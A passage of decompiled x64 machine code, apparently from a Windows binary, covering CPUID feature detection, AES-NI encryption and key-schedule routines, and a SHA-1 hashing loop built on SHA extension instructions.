  unsigned __int64 v16; // rdx
  _QWORD ***v17; // rcx
  _QWORD *v18; // rax
  __int128 v20; // [rsp+20h] [rbp-60h] BYREF
  __int64 v21; // [rsp+30h] [rbp-50h]
  __int128 v22; // [rsp+38h] [rbp-48h] BYREF
  __int64 v23; // [rsp+48h] [rbp-38h]
  __int128 v24; // [rsp+50h] [rbp-30h] BYREF
  unsigned __int64 v25; // [rsp+60h] [rbp-20h]
  __int64 v26[3]; // [rsp+68h] [rbp-18h] BYREF

  v4 = *(_QWORD *)(a3 + 16);
  v7 = 0i64;
  if ( a1 )
    v7 = (_QWORD **)*a1;
  v8 = *(_QWORD *)(a4 + 16);
  v9 = 0i64;
  if ( a1 )
    v9 = (_QWORD **)*a1;
  v10 = a1[3];
  v11 = v10 + a1[4];
  v12 = v4 - v10;
  v13 = v8 - v4;
  if ( v4 - v10 >= v11 - v8 )
  {
    v24 = 0i64;
    if ( v7 && *v7 )
      *(_QWORD *)&v24 = **v7;
    v22 = *a1;
    v25 = v4;
    v23 = v11;
    v20 = 0i64;
    if ( v9 && *v9 )
      *(_QWORD *)&v20 = **v9;
    v21 = v8;
    sub_13F13C130(v26, (__int64)&v20, (__int64)&v22, (__int64)&v24);
    for ( ; v13; --v13 )
    {
      v14 = a1[4]-- == 1;
      if ( v14 )
        a1[3] = 0i64;
    }
  }
  else
  {
    v20 = 0i64;
    if ( v9 && *v9 )
      *(_QWORD *)&v20 = **v9;
    v21 = v8;
    v22 = 0i64;
    if ( v7 && *v7 )
      *(_QWORD *)&v22 = **v7;
    v24 = *a1;
    v23 = v4;
    v25 = v10;
    sub_13F13C380(v26, (__int64)&v24, (__int64)&v22, (__int64)&v20);
    for ( ; v13; --v13 )
    {
      v14 = a1[4]-- == 1;
      if ( v14 )
        a1[3] = 0i64;
      else
        ++a1[3];
    }
  }
  v15 = 0i64;
  v16 = a1[3];
  if ( *a1 )
  {
    v17 = *(_QWORD ****)*a1;
    if ( v17 )
      v15 = *v17;
  }
  *a2 = 0i64;
  a2[2] = v16 + v12;
  a2[1] = 0i64;
  if ( v15 )
  {
    v18 = *v15;
    if ( v18 )
      *a2 = *v18;
  }
  return a2;
}
// 13F13EC50: using guessed type _QWORD var_18[3];

//----- (000000013F13EE10) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F13EE10()
{
  unsigned int v4; // er13
  int v5; // er15
  int v7; // er14
  int v8; // er12
  unsigned int v13; // esi
  int v14; // edi
  char v15; // al
  char v16; // r9
  int v17; // er8
  bool v23; // zf
  int v34; // eax
  unsigned int v40; // er8
  __int64 result; // rax
  __int64 v52; // [rsp+20h] [rbp-40h]

  v52 = 0i64;
  __asm { cpuid }
  v4 = _RAX;
  v5 = _RCX;
  _RAX = 1i64;
  v7 = _RDX;
  v8 = _RBX;
  __asm { cpuid }
  v13 = _RAX;
  v14 = _RCX;
  v15 = (_RCX & 0x8000000) != 0;
  byte_13F1C56B1 = v15;
  if ( (_RCX & 0x8000000) == 0 )
  {
    v15 = sub_13F1021D0();
    byte_13F1C56B1 = v15;
  }
  if ( !v15 )
  {
    v17 = 64;
    goto LABEL_41;
  }
  byte_13F1C56B2 = (v14 & 0x200) != 0;
  byte_13F1C56B3 = (v14 & 0x80000) != 0;
  byte_13F1C56B4 = (v14 & 0x100000) != 0;
  byte_13F1C56B5 = (v14 & 0x400000) != 0;
  byte_13F1C56B6 = (v14 & 0x2000000) != 0;
  byte_13F1C56B7 = (v14 & 2) != 0;
  if ( (v14 & 0x18000000) == 402653184 )
  {
    __asm { xgetbv }
    v16 = 0;
    byte_13F1C56B8 = 0;
  }
  else
  {
    v16 = 1;
  }
  if ( v8 == 1970169159 && v5 == 1818588270 && v7 == 1231384169 )
  {
    byte_13F1C56BC = (v13 & 0xF00) == 3840;
    v17 = 8 * BYTE1(_RBX);
    byte_13F1C56BD = (v14 & 0x40000000) != 0;
    if ( v4 >= 7 )
    {
      _RAX = 7i64;
      __asm { cpuid }
      byte_13F1C56BE = (_RBX & 0x40000) != 0;
      byte_13F1C56BB = (_RBX & 0x80000) != 0;
      byte_13F1C56B9 = v16 & 1;
      byte_13F1C56BA = (_RBX & 0x20000000) != 0;
      goto LABEL_41;
    }
    goto LABEL_32;
  }
  if ( v8 == 1752462657 )
  {
    if ( v5 == 1145913699 )
    {
      v23 = v7 == 1769238117;
      goto LABEL_18;
    }
  }
  else if ( v8 == 1766083905 && v5 == 1952801395 )
  {
    v23 = v7 == 561145204;
LABEL_18:
    if ( v23 )
      goto LABEL_22;
  }
  if ( v8 == 1869052232 && v5 == 1701734773 && v7 == 1852131182 )
  {
LABEL_22:
    _RAX = 2147483653i64;
    byte_13F1C56BD = (v14 & 0x40000000) != 0;
    __asm { cpuid }
    v17 = (unsigned __int8)_RCX;
    if ( v4 >= 7 )
    {
      _RAX = 7i64;
      __asm { cpuid }
      byte_13F1C56BE = (_RBX & 0x40000) != 0;
      byte_13F1C56BB = (_RBX & 0x80000) != 0;
      byte_13F1C56B9 = (_RBX & 0x20) != 0;
      byte_13F1C56BA = (_RBX & 0x20000000) != 0;
    }
    v34 = (v13 >> 8) & 0xF;
    if ( v34 == 15 )
      v34 = (unsigned __int8)(v13 >> 20) + 15;
    if ( (unsigned int)(v34 - 21) <= 1 )
    {
      byte_13F1C56B9 = v16;
      byte_13F1C56BD = 0;
      byte_13F1C56BE = 0;
      goto LABEL_41;
    }
    goto LABEL_32;
  }
  if ( v8 == 1953391939 )
  {
    if ( v5 != 1936487777 || v7 != 1215460705 )
    {
LABEL_31:
      v17 = 64;
LABEL_32:
      byte_13F1C56B9 = v16;
      goto LABEL_41;
    }
  }
  else if ( v8 != 843139414 || v5 != 843139414 || v7 != 843139414 )
  {
    goto LABEL_31;
  }
  _RAX = 3221225472i64;
  __asm { cpuid }
  v40 = _RAX;
  if ( (unsigned int)_RAX >= 0xC0000001 )
  {
    _RAX = 3221225473i64;
    __asm { cpuid }
    byte_13F1C56BF = (_RDX & 0xC) != 0;
    byte_13F1C56C0 = (_RDX & 0xC0) != 0;
    byte_13F1C56C1 = (_RDX & 0x300) != 0;
    byte_13F1C56C2 = (_RDX & 0xC00) != 0;
    byte_13F1C56C3 = (_RDX & 0x3000) != 0;
  }
  if ( v40 < 0xC0000005 )
    goto LABEL_31;
  _RAX = 3221225477i64;
  byte_13F1C56B9 = v16 & 1;
  __asm { cpuid }
  v17 = (unsigned __int8)_RCX;
LABEL_41:
  result = 64i64;
  if ( !v17 )
    v17 = 64;
  dword_13F1B7070 = v17;
  byte_13F1C56B0 = 1;
  return result;
}
// 13F13EE90: write access to const memory at 13F1C56B1 has been detected
// 13F13EEA0: write access to const memory at 13F1C56B1 has been detected
// 13F13EEB5: write access to const memory at 13F1C56B2 has been detected
// 13F13EEC2: write access to const memory at 13F1C56B3 has been detected
// 13F13EECF: write access to const memory at 13F1C56B4 has been detected
// 13F13EEDC: write access to const memory at 13F1C56B5 has been detected
// 13F13EEE9: write access to const memory at 13F1C56B6 has been detected
// 13F13EEF5: write access to const memory at 13F1C56B7 has been detected
// 13F13EF1F: write access to const memory at 13F1C56B8 has been detected
// 13F13EF63: write access to const memory at 13F1C56BC has been detected
// 13F13EF7C: write access to const memory at 13F1C56BD has been detected
// 13F13EFA3: write access to const memory at 13F1C56BE has been detected
// 13F13EFB3: write access to const memory at 13F1C56BB has been detected
// 13F13EFC6: write access to const memory at 13F1C56B9 has been detected
// 13F13EFCC: write access to const memory at 13F1C56B9 has been detected
// 13F13EFD3: write access to const memory at 13F1C56BA has been detected
// 13F13F04C: write access to const memory at 13F1C56BD has been detected
// 13F13F081: write access to const memory at 13F1C56BE has been detected
// 13F13F091: write access to const memory at 13F1C56BB has been detected
// 13F13F0A7: write access to const memory at 13F1C56B9 has been detected
// 13F13F0AD: write access to const memory at 13F1C56BA has been detected
// 13F13F0D2: write access to const memory at 13F1C56B9 has been detected
// 13F13F0D9: write access to const memory at 13F1C56BD has been detected
// 13F13F0E0: write access to const memory at 13F1C56BE has been detected
// 13F13F10E: write access to const memory at 13F1C56B9 has been detected
// 13F13F15E: write access to const memory at 13F1C56BF has been detected
// 13F13F16E: write access to const memory at 13F1C56C0 has been detected
// 13F13F17B: write access to const memory at 13F1C56C1 has been detected
// 13F13F188: write access to const memory at 13F1C56C2 has been detected
// 13F13F195: write access to const memory at 13F1C56C3 has been detected
// 13F13F1B0: write access to const memory at 13F1C56B9 has been detected
// 13F13F1DE: write access to const memory at 13F1B7070 has been detected
// 13F13F1E5: write access to const memory at 13F1C56B0 has been detected
// 13F13F0D2: masking with 0x1 was optimized away because r9.1 <= 0x1
// 13F13F10E: masking with 0x1 was optimized away because r9.1 <= 0x1
// 13F1B7070: using guessed type int dword_13F1B7070;
// 13F1C56B0: using guessed type char byte_13F1C56B0;
// 13F1C56B1: using guessed type char byte_13F1C56B1;
// 13F1C56B2: using guessed type char byte_13F1C56B2;
// 13F1C56B3: using guessed type char byte_13F1C56B3;
// 13F1C56B4: using guessed type char byte_13F1C56B4;
// 13F1C56B5: using guessed type char byte_13F1C56B5;
// 13F1C56B6: using guessed type char byte_13F1C56B6;
// 13F1C56B7: using guessed type char byte_13F1C56B7;
// 13F1C56B8: using guessed type char byte_13F1C56B8;
// 13F1C56B9: using guessed type char byte_13F1C56B9;
// 13F1C56BA: using guessed type char byte_13F1C56BA;
// 13F1C56BB: using guessed type char byte_13F1C56BB;
// 13F1C56BC: using guessed type char byte_13F1C56BC;
// 13F1C56BD: using guessed type char byte_13F1C56BD;
// 13F1C56BE: using guessed type char byte_13F1C56BE;
// 13F1C56BF: using guessed type char byte_13F1C56BF;
// 13F1C56C0: using guessed type char byte_13F1C56C0;
// 13F1C56C1: using guessed type char byte_13F1C56C1;
// 13F1C56C2: using guessed type char byte_13F1C56C2;
// 13F1C56C3: using guessed type char byte_13F1C56C3;

//----- (000000013F13F220) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F13F220(
        void (__fastcall *a1)(__m128i *, __int64, _QWORD),
        void (__fastcall *a2)(__m128i *, __m128i *, __m128i *, __m128i *, __int64, unsigned int),
        __int64 a3,
        unsigned int a4,
        __m128i *a5,
        const __m128i *a6,
        __m128i *a7,
        unsigned __int64 a8,
        char a9)
{
  char v9; // cl
  const __m128i *v10; // rsi
  __int64 v11; // r15
  __int64 v12; // r10
  void (__fastcall *v13)(__m128i *, __m128i *, __m128i *, __m128i *, __int64, unsigned int); // r11
  __int64 v14; // r14
  __int64 v15; // r13
  unsigned __int64 v16; // r12
  __m128i *v17; // rbx
  __m128i *v18; // rdi
  int v19; // edx
  __m128i v20; // xmm2
  __m128i si128; // xmm1
  __m128i v22; // xmm3
  __m128i v23; // xmm4
  __m128i v24; // xmm5
  __m128i v25; // xmm0
  __m128i v26; // xmm0
  __m128i v27; // xmm1
  __m128i v28; // xmm2
  __m128i v29; // xmm3
  __m128i v30; // xmm3
  __m128i *v31; // rdi
  __m128i *v32; // rdi
  __m128i *v33; // rdi
  unsigned __int64 v34; // r12
  int v35; // ecx
  __m128i v36; // xmm1
  __m128i v37; // xmm0
  char v39; // [rsp+30h] [rbp-61h]
  unsigned __int64 v40; // [rsp+38h] [rbp-59h]
  __m128i v41; // [rsp+40h] [rbp-51h] BYREF
  __m128i v42; // [rsp+50h] [rbp-41h] BYREF
  __m128i v43; // [rsp+60h] [rbp-31h] BYREF
  __m128i v44; // [rsp+70h] [rbp-21h] BYREF
  unsigned int v48; // [rsp+E8h] [rbp+57h]
  char v49; // [rsp+F8h] [rbp+67h]
  unsigned __int64 v50; // [rsp+108h] [rbp+77h]
  int v51; // [rsp+110h] [rbp+7Fh]

  v48 = a4;
  v9 = a9;
  v10 = a6;
  v11 = 16i64;
  if ( (a9 & 3) != 0 )
    v11 = 0i64;
  v12 = a3;
  v13 = a2;
  v14 = 8i64 * (~a9 & 2);
  v15 = a6 != 0i64 ? 0x10 : 0;
  if ( !a6 || (v49 = 1, (a9 & 4) == 0) )
    v49 = 0;
  if ( !v10 || (v39 = 1, (a9 & 4) != 0) )
    v39 = 0;
  v16 = a8;
  if ( (a9 & 8) != 0 )
  {
    v17 = (__m128i *)((char *)a5 + a8 - 16);
    v18 = (__m128i *)((char *)a7 + a8 - 16);
    v10 = (const __m128i *)((char *)v10 + a8 - 16);
    v11 = -v11;
    v15 = -v15;
    v14 = -8i64 * (~a9 & 2);
  }
  else
  {
    v18 = a7;
    v17 = a5;
  }
  if ( (a9 & 0x10) != 0 && a8 >= 0x40 )
  {
    v19 = a9 & 1;
    v40 = a8 >> 6;
    a8 += -64i64 * (a8 >> 6);
    do
    {
      v20 = _mm_loadu_si128(v17);
      v41 = v20;
      if ( v19 )
      {
        si128 = _mm_load_si128((const __m128i *)&xmmword_13F189260);
        v22 = _mm_add_epi32(v20, si128);
        v23 = _mm_add_epi32(v22, si128);
        v24 = _mm_add_epi32(v23, si128);
        *v17 = _mm_add_epi32(v24, si128);
      }
      else
      {
        v22 = _mm_loadu_si128((__m128i *)((char *)v17 + v11));
        v23 = _mm_loadu_si128((__m128i *)((char *)v17 + v11 + v11));
        v24 = _mm_loadu_si128((__m128i *)((char *)v17 + v11 + v11 + v11));
        v17 = (__m128i *)((char *)v17 + v11 + v11 + v11 + v11);
      }
      v44 = v24;
      v43 = v23;
      v42 = v22;
      if ( v49 )
      {
        v41 = _mm_xor_si128(_mm_loadu_si128(v10), v20);
        v42 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)((char *)v10 + v15)), v22);
        v43 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)((char *)v10 + v15 + v15)), v23);
        v25 = _mm_loadu_si128((const __m128i *)((char *)v10 + v15 + v15 + v15));
        v10 = (const __m128i *)((char *)v10 + v15 + v15 + v15 + v15);
        v44 = _mm_xor_si128(v25, v24);
      }
      v13(&v41, &v42, &v43, &v44, v12, a4);
      if ( v39 )
      {
        v26 = _mm_xor_si128(_mm_loadu_si128(v10), v41);
        v27 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)((char *)v10 + v15)), v42);
        v28 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)((char *)v10 + v15 + v15)), v43);
        v29 = _mm_loadu_si128((const __m128i *)((char *)v10 + v15 + v15 + v15));
        v10 = (const __m128i *)((char *)v10 + v15 + v15 + v15 + v15);
        v30 = _mm_xor_si128(v29, v44);
      }
      else
      {
        v26 = _mm_load_si128(&v41);
        v27 = _mm_load_si128(&v42);
        v28 = _mm_load_si128(&v43);
        v30 = _mm_load_si128(&v44);
      }
      v19 = a9 & 1;
      a4 = v48;
      v12 = a3;
      v13 = a2;
      *v18 = v26;
      v31 = (__m128i *)((char *)v18 + v14);
      *v31 = v27;
      v32 = (__m128i *)((char *)v31 + v14);
      *v32 = v28;
      v33 = (__m128i *)((char *)v32 + v14);
      *v33 = v30;
      v18 = (__m128i *)((char *)v33 + v14);
      --v40;
    }
    while ( v40 );
    v16 = a8;
    v9 = a9;
  }
  if ( v16 < 0x10 )
    return v16;
  v34 = v16 >> 4;
  v35 = v9 & 1;
  v51 = v35;
  v50 = -16i64 * v34 + a8;
  do
  {
    v36 = _mm_loadu_si128(v17);
    v44 = v36;
    if ( v49 )
      v44 = _mm_xor_si128(_mm_loadu_si128(v10), v36);
    if ( v35 )
      ++v17->m128i_i8[15];
    a1(&v44, v12, a4);
    if ( v39 )
      v37 = _mm_xor_si128(_mm_loadu_si128(v10), v44);
    else
      v37 = _mm_load_si128(&v44);
    v35 = v51;
    v17 = (__m128i *)((char *)v17 + v11);
    a4 = v48;
    v10 = (const __m128i *)((char *)v10 + v15);
    v12 = a3;
    *v18 = v37;
    v18 = (__m128i *)((char *)v18 + v14);
    --v34;
  }
  while ( v34 );
  return v50;
}
// 13F189260: using guessed type __int128 xmmword_13F189260;
// 13F13F220: using guessed type __m128i var_50;

//----- (000000013F13F530) ----------------------------------------------------
__int64 __fastcall sub_13F13F530(
        __m128i *a1,
        __m128i *a2,
        __m128i *a3,
        __m128i *a4,
        const __m128i *a5,
        unsigned int a6)
{
  __m128i v7; // xmm2
  const __m128i *v8; // rcx
  __int64 v9; // r11
  __int64 result; // rax

  v7 = _mm_loadu_si128(a5);
  *a1 = _mm_xor_si128(_mm_loadu_si128(a1), v7);
  *a2 = _mm_xor_si128(_mm_loadu_si128(a2), v7);
  *a3 = _mm_xor_si128(_mm_loadu_si128(a3), v7);
  *a4 = _mm_xor_si128(_mm_loadu_si128(a4), v7);
  if ( a6 > 1 )
  {
    v8 = a5 + 1;
    v9 = a6 - 1;
    do
    {
      _XMM2 = _mm_loadu_si128(v8++);
      _XMM0 = _mm_loadu_si128(a1);
      __asm { aesenc  xmm0, xmm2 }
      *a1 = _XMM0;
      _XMM1 = _mm_loadu_si128(a2);
      __asm { aesenc  xmm1, xmm2 }
      *a2 = _XMM1;
      _XMM0 = _mm_loadu_si128(a3);
      __asm { aesenc  xmm0, xmm2 }
      *a3 = _XMM0;
      _XMM1 = _mm_loadu_si128(a4);
      __asm { aesenc  xmm1, xmm2 }
      *a4 = _XMM1;
      --v9;
    }
    while ( v9 );
  }
  _XMM0 = _mm_loadu_si128(a1);
  result = 2i64 * a6;
  _XMM2 = _mm_loadu_si128(&a5[a6]);
  __asm { aesenclast xmm0, xmm2 }
  *a1 = _XMM0;
  _XMM1 = _mm_loadu_si128(a2);
  __asm { aesenclast xmm1, xmm2 }
  *a2 = _XMM1;
  _XMM0 = _mm_loadu_si128(a3);
  __asm { aesenclast xmm0, xmm2 }
  *a3 = _XMM0;
  _XMM1 = _mm_loadu_si128(a4);
  __asm { aesenclast xmm1, xmm2 }
  *a4 = _XMM1;
  return result;
}

//----- (000000013F13F630) ----------------------------------------------------
__int64 __fastcall sub_13F13F630(__m128i *a1, __m128i *_RDX, unsigned int a3)
{
  unsigned int v3; // er11
  unsigned int v5; // er9
  __int64 result; // rax

  v3 = a3 - 1;
  _XMM0 = _mm_xor_si128(_mm_loadu_si128(a1), *_RDX);
  v5 = 1;
  for ( *a1 = _XMM0; v5 < v3; *a1 = _XMM0 )
  {
    _RAX = 2i64 * v5;
    _RCX = 2i64 * (v5 + 1);
    v5 += 2;
    __asm { aesenc  xmm0, xmmword ptr [rdx+rax*8] }
    *a1 = _XMM0;
    __asm { aesenc  xmm0, xmmword ptr [rdx+rcx*8] }
  }
  _RAX = 2i64 * v3;
  __asm { aesenc  xmm0, xmmword ptr [rdx+rax*8] }
  *a1 = _XMM0;
  result = 2i64 * a3;
  __asm { aesenclast xmm0, xmmword ptr [rdx+rax*8] }
  *a1 = _XMM0;
  return result;
}

//----- (000000013F13F6A0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F13F6A0(
        __int64 a1,
        unsigned int a2,
        __m128i *a3,
        const __m128i *a4,
        __m128i *a5,
        unsigned __int64 a6,
        char a7)
{
  return sub_13F13F220(
           (void (__fastcall *)(__m128i *, __int64, _QWORD))sub_13F13F630,
           (void (__fastcall *)(__m128i *, __m128i *, __m128i *, __m128i *, __int64, unsigned int))sub_13F13F530,
           a1,
           a2,
           a3,
           a4,
           a5,
           a6,
           a7);
}

//----- (000000013F13F700) ----------------------------------------------------
__int64 __fastcall sub_13F13F700(__m128i *a1, int a2)
{
  __m128i v2; // xmm1
  __int64 v3; // rdx
  unsigned int v4; // er8
  __int64 result; // rax

  v2 = _mm_loadu_si128(a1);
  v3 = (unsigned int)(4 * a2);
  v4 = 4;
  *a1 = _mm_loadu_si128((__m128i *)((char *)a1 + 4 * v3));
  _R9 = a1;
  *(__m128i *)((char *)a1 + 4 * v3) = v2;
  _RDX = (unsigned int)(v3 - 4);
  if ( (unsigned int)_RDX > 4 )
  {
    do
    {
      __asm { aesimc  xmm0, xmmword ptr [r9+rdx*4] }
      _RAX = v4;
      v4 += 4;
      __asm { aesimc  xmm1, xmmword ptr [r9+rax*4] }
      *(__m128i *)((char *)a1 + 4 * _RAX) = _XMM0;
      *(__m128i *)((char *)a1 + 4 * _RDX) = _XMM1;
      _RDX = (unsigned int)(_RDX - 4);
    }
    while ( v4 < (unsigned int)_RDX );
  }
  result = v4;
  __asm { aesimc  xmm0, xmmword ptr [r9+rax*4] }
  a1[v4 / 4] = _XMM0;
  return result;
}

//----- (000000013F13F770) ----------------------------------------------------
__int32 *__fastcall sub_13F13F770(const __m128i *a1, unsigned __int64 a2, __m128i *a3)
{
  __m128i *v3; // rbx
  int *v6; // rdx
  int v8; // ecx
  __int64 v9; // r10
  __m128i *v10; // r9
  int v11; // eax
  int v12; // ecx
  __int32 *m128i_i32; // r11
  __int32 *result; // rax
  int v15; // eax
  int v16; // ecx
  int v19; // eax
  int v20; // ecx
  int v21; // eax
  int v22; // ecx
  int v24; // ecx
  int v25; // ecx
  int v26; // eax
  int v27; // ecx

  v3 = a3;
  _XMM6 = _mm_loadu_si128((const __m128i *)((char *)a1 + a2 - 16));
  sub_13F15EB00(a3, a1, a2);
  v6 = &dword_13F189234;
  __asm { aeskeygenassist xmm0, xmm6, 0 }
  v8 = v3->m128i_i32[0] ^ _mm_extract_epi32(_XMM0, 3) ^ 1;
  v9 = a2 >> 2;
  v3->m128i_i32[v9] = v8;
  v10 = (__m128i *)((char *)v3 + v9 * 4);
  v11 = v8 ^ v3->m128i_i32[1];
  v3->m128i_i32[v9 + 1] = v11;
  v12 = v11 ^ v3->m128i_i32[2];
  v3->m128i_i32[v9 + 2] = v12;
  m128i_i32 = v3[(a2 >> 2) + 7].m128i_i32;
  v3->m128i_i32[v9 + 3] = v12 ^ v3->m128i_i32[3];
  for ( result = &v3[1].m128i_i32[v9]; result != m128i_i32; result = &v3[1].m128i_i32[v9] )
  {
    if ( a2 == 24 )
    {
      v15 = v3[1].m128i_i32[0] ^ v3[2].m128i_i32[1];
      v16 = v15 ^ v3[1].m128i_i32[1];
      v3[2].m128i_i32[2] = v15;
      v3[2].m128i_i32[3] = v16;
      _XMM6 = _mm_insert_epi32(_XMM6, v16, 3);
    }
    else if ( a2 == 32 )
    {
      _XMM6 = _mm_insert_epi32(_XMM6, v3[2].m128i_i32[3], 3);
      __asm { aeskeygenassist xmm0, xmm6, 0 }
      v19 = v3[1].m128i_i32[0] ^ _mm_extract_epi32(_XMM0, 2);
      v20 = v19 ^ v3[1].m128i_i32[1];
      v3[3].m128i_i32[0] = v19;
      v21 = v20 ^ v3[1].m128i_i32[2];
      v3[3].m128i_i32[1] = v20;
      v22 = v21 ^ v3[1].m128i_i32[3];
      v3[3].m128i_i32[2] = v21;
      v3[3].m128i_i32[3] = v22;
      _XMM6 = _mm_insert_epi32(_XMM6, v22, 3);
    }
    else
    {
      _XMM6 = _mm_insert_epi32(_XMM6, v3[1].m128i_i32[3], 3);
    }
    v3 = v10;
    __asm { aeskeygenassist xmm0, xmm6, 0 }
    v24 = *v6++ ^ _mm_extract_epi32(_XMM0, 3);
    v25 = v10->m128i_i32[0] ^ v24;
    v10 = (__m128i *)((char *)v10 + v9 * 4);
    v10->m128i_i32[0] = v25;
    v26 = v25 ^ v3->m128i_i32[1];
    v3->m128i_i32[v9 + 1] = v26;
    v27 = v26 ^ v3->m128i_i32[2];
    v3->m128i_i32[v9 + 2] = v27;
    v3->m128i_i32[v9 + 3] = v27 ^ v3->m128i_i32[3];
  }
  return result;
}
// 13F189234: using guessed type int dword_13F189234;

//----- (000000013F13F8E0) ----------------------------------------------------
__int64 __fastcall sub_13F13F8E0(__m128i *a1, const __m128i *a2, unsigned __int64 a3, int a4)
{
  __int64 result; // rax
  __m128i si128; // xmm11
  const __m128i *v8; // rdx
  unsigned __int64 v9; // r8
  __m128i v11; // xmm9
  __m128i v42; // xmm3

  result = 0i64;
  _XMM4 = _mm_unpacklo_epi32(
            (__m128i)0i64,
            _mm_unpacklo_epi32(_mm_cvtsi32_si128(0), _mm_cvtsi32_si128(a1[1].m128i_u32[0])));
  _XMM10 = _mm_shuffle_epi32(_mm_loadu_si128(a1), 27);
  if ( a4 == 1 )
    si128 = _mm_load_si128((const __m128i *)&xmmword_13F1894B0);
  else
    si128 = _mm_load_si128((const __m128i *)&xmmword_13F1894C0);
  if ( a3 >= 0x40 )
  {
    v8 = a2 + 2;
    v9 = a3 >> 6;
    do
    {
      _XMM1 = _XMM10;
      v11 = _XMM10;
      _XMM7 = _mm_shuffle_epi8(_mm_loadu_si128(v8), si128);
      _XMM6 = _mm_shuffle_epi8(_mm_loadu_si128(v8 + 1), si128);
      _XMM2 = _mm_shuffle_epi8(_mm_loadu_si128(v8 - 2), si128);
      _XMM3 = _mm_shuffle_epi8(_mm_loadu_si128(v8 - 1), si128);
      _XMM8 = _XMM4;
      _XMM0 = _mm_add_epi32(_XMM2, _XMM4);
      __asm
      {
        sha1rnds4 xmm10, xmm0, 0
        sha1nexte xmm1, xmm3
        sha1msg1 xmm2, xmm3
      }
      _XMM0 = _XMM10;
      _XMM4 = _mm_xor_si128(_XMM7, _XMM2);
      __asm
      {
        sha1rnds4 xmm10, xmm1, 0
        sha1nexte xmm0, xmm7
        sha1msg1 xmm3, xmm7
        sha1msg1 xmm7, xmm6
      }
      _XMM1 = _XMM10;
      __asm
      {
        sha1rnds4 xmm10, xmm0, 0
        sha1nexte xmm1, xmm6
      }
      _XMM0 = _XMM10;
      _XMM2 = _mm_xor_si128(_XMM6, _XMM3);
      __asm
      {
        sha1rnds4 xmm10, xmm1, 0
        sha1msg2 xmm4, xmm6
        sha1nexte xmm0, xmm4
      }
      _XMM1 = _XMM10;
      _XMM7 = _mm_xor_si128(_XMM7, _XMM4);
      __asm
      {
        sha1rnds4 xmm10, xmm0, 0
        sha1msg2 xmm2, xmm4
        sha1nexte xmm1, xmm2
        sha1msg2 xmm7, xmm2
      }
      _XMM0 = _XMM10;
      v42 = _XMM7;
      __asm
      {
        sha1rnds4 xmm10, xmm1, 1
        sha1nexte xmm0, xmm7
      }
      _XMM1 = _XMM10;
      __asm
      {
        sha1rnds4 xmm10, xmm0, 1
        sha1msg1 xmm6, xmm4
      }
      _XMM6 = _mm_xor_si128(_XMM6, _XMM2);
      _XMM0 = _XMM10;
      __asm
      {
        sha1msg2 xmm6, xmm7
        sha1nexte xmm1, xmm6
        sha1rnds4 xmm10, xmm1, 1
        sha1msg1 xmm4, xmm2
        sha1msg1 xmm2, xmm7
        sha1msg1 xmm7, xmm6
      }
      _XMM1 = _XMM10;
      _XMM5 = _mm_xor_si128(_XMM6, _XMM2);
      _XMM3 = _mm_xor_si128(v42, _XMM4);
      __asm
      {
        sha1msg2 xmm3, xmm6
        sha1nexte xmm0, xmm3
        sha1rnds4 xmm10, xmm0, 1
        sha1msg2 xmm5, xmm3
        sha1nexte xmm1, xmm5
      }
      _XMM0 = _XMM10;
      _XMM7 = _mm_xor_si128(_XMM7, _XMM3);
      __asm
      {
        sha1msg2 xmm7, xmm5
        sha1rnds4 xmm10, xmm1, 1
        sha1msg1 xmm6, xmm3
        sha1nexte xmm0, xmm7
      }
      _XMM1 = _XMM10;
      _XMM6 = _mm_xor_si128(_XMM6, _XMM5);
      __asm
      {
        sha1msg2 xmm6, xmm7
        sha1msg1 xmm3, xmm5
        sha1rnds4 xmm10, xmm0, 2
        sha1nexte xmm1, xmm6
      }
      _XMM2 = _mm_xor_si128(_XMM7, _XMM3);
      _XMM0 = _XMM10;
      __asm
      {
        sha1msg1 xmm5, xmm7
        sha1rnds4 xmm10, xmm1, 2
        sha1msg2 xmm2, xmm6
        sha1msg1 xmm7, xmm6
      }
      v8 += 4;
      _XMM1 = _XMM10;
      _XMM7 = _mm_xor_si128(_XMM7, _XMM2);
      _XMM4 = _mm_xor_si128(_XMM6, _XMM5);
      __asm
      {
        sha1nexte xmm0, xmm2
        sha1rnds4 xmm10, xmm0, 2
      }
      _XMM0 = _XMM10;
      __asm
      {
        sha1msg2 xmm4, xmm2
        sha1nexte xmm1, xmm4
        sha1rnds4 xmm10, xmm1, 2
      }
      _XMM1 = _XMM10;
      __asm { sha1msg1 xmm6, xmm2 }
      _XMM6 = _mm_xor_si128(_XMM6, _XMM4);
      __asm
      {
        sha1msg2 xmm7, xmm4
        sha1msg2 xmm6, xmm7
        sha1nexte xmm0, xmm7
        sha1rnds4 xmm10, xmm0, 2
      }
      _XMM0 = _XMM10;
      __asm
      {
        sha1nexte xmm1, xmm6
        sha1rnds4 xmm10, xmm1, 3
      }
      _XMM1 = _XMM10;
      __asm { sha1msg1 xmm2, xmm4 }
      _XMM3 = _mm_xor_si128(_XMM7, _XMM2);
      __asm { sha1msg1 xmm4, xmm7 }
      _XMM2 = _mm_xor_si128(_XMM6, _XMM4);
      __asm
      {
        sha1msg2 xmm3, xmm6
        sha1msg1 xmm7, xmm6
      }
      _XMM7 = _mm_xor_si128(_XMM7, _XMM3);
      __asm
      {
        sha1nexte xmm0, xmm3
        sha1rnds4 xmm10, xmm0, 3
      }
      _XMM0 = _XMM10;
      __asm
      {
        sha1msg2 xmm2, xmm3
        sha1nexte xmm1, xmm2
        sha1rnds4 xmm10, xmm1, 3
      }
      _XMM1 = _XMM10;
      __asm { sha1msg1 xmm6, xmm3 }
      _XMM6 = _mm_xor_si128(_XMM6, _XMM2);
      __asm
      {
        sha1msg2 xmm7, xmm2
        sha1nexte xmm0, xmm7
        sha1rnds4 xmm10, xmm0, 3
      }
      _XMM4 = _XMM10;
      __asm
      {
        sha1msg2 xmm6, xmm7
        sha1nexte xmm1, xmm6
        sha1rnds4 xmm10, xmm1, 3
      }
      _XMM10 = _mm_add_epi32(_XMM10, v11);
      __asm { sha1nexte xmm4, xmm8 }
      --v9;
    }
    while ( v9 );
  }
  *a1 = _mm_shuffle_epi32(_XMM10, 27);
  a1[1].m128i_i32[0] = _mm_extract_epi32(_XMM4, 3);
  return result;
}
